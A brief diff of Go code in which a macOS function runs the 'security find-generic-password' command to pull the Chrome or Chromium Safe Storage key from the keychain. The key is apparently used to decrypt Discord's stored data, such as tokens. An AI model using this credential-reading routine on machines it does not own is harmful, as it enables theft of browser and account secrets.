@@ -40,8 +40,8 @@ func discordV10Key(appDir string) []byte {
 }
 
 func darwinDiscordKey() []byte {
-	for _, service := range []string{"Chromium Safe Storage", "Chrome Safe Storage"} {
-		out, err := exec.Command("security", "find-generic-password", "-wa", service).Output()
+	for _, account := range []string{"Chrome", "Chromium"} {
+		out, err := exec.Command("security", "find-generic-password", "-wa", account).Output()
 		if err != nil {
 			continue
 		}
